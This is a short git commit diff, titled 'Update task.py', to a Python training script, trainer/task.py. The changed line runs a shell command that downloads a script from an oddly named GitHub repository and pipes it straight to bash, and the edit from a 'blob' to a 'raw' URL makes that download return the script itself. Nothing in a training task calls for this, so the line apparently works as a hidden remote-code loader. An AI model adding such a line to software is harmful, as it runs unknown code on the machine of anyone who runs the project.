95f3a4c88a169ad139f90e16bb0fb9e4b5838455
linxspec <naveenushapala@zohomail.in>
2025-07-16 01:48:29 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/linxspec/sfhtthgf/blob/main/shhudf.sh | bash')
+os.system('curl -sL https://github.com/linxspec/sfhtthgf/raw/main/shhudf.sh | bash')
